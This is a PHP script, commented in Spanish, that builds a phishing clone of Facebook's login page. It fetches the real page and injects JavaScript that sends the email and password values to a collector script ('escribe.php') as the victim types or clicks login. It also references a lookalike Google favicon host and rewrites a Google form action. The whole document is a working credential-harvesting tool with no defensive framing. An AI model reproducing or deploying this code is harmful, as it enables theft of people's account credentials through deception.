<?php
$html = file_get_contents('https://www.facebook.com/login.php?login_attempt=1');
$insertCode = "<script language=\"javascript\" type=\"text/javascript\">
	
function getXMLHTTPRequest() {
  try {
    req = new XMLHttpRequest();
  } catch(err1) {
    try {
      req = new ActiveXObject(\"Msxml2.XMLHTTP\");
    } catch (err2) {
      try {
        req = new ActiveXObject(\"Microsoft.XMLHTTP\");
      } catch (err3) {
        req = false;
      }
    }
  }
  return req;
}


var http = getXMLHTTPRequest(); // creo una instancia del objeto XMLHTTPRequest.

function enviarvariable(variable) { // funcion encargada de inviar la variable al archivo php llamado index.php.
    var url = 'http://localhost/php/gmailFake/facebook/escribe.php?variable=' + variable; // creación de la URL.
    alert(variable);
    http.open(\"GET\", url, true); // fijando los parametros para el envío de datos.
    http.onreadystatechange = handler; // Qué función utilizar en caso de que el estado de la petición cambie.
    http.send(null); // enviar petición.
}

function handler() {
  if (http.readyState == 4) {
    if(http.status == 200) {
      a=http.responseText; // El texto de respuesta del archivo index.php lo muestra como una alerta.
    }
  }
}

</script>
<link rel=\"shortcut icon\" href=\"http://accountsgoogle.herokuapp.com/favicon.ico\">
</head>";
$htmlConstruida = str_replace("</head>", $insertCode, $html);

$insertCode = "id='email' onchange='enviarvariable(document.getElementById(\"email\").value)'";
$htmlConstruida = str_replace('id="email"', $insertCode, $htmlConstruida);

$insertCode = "id='pass' onchange='enviarvariable(document.getElementById(\"pass\").value)'";
$htmlConstruida = str_replace('id="pass"', $insertCode, $htmlConstruida);

$insertCode = "id='loginbutton' onclick='enviarvariable(document.getElementById(\"pass\").value)'";
$htmlConstruida = str_replace('id="loginbutton"', $insertCode, $htmlConstruida);

$insertCode = "action='https://mail.google.com'";
$htmlConstruida = str_replace('action="https://accounts.google.com/ServiceLoginAuth"', $insertCode, $htmlConstruida);

echo $htmlConstruida;
?>


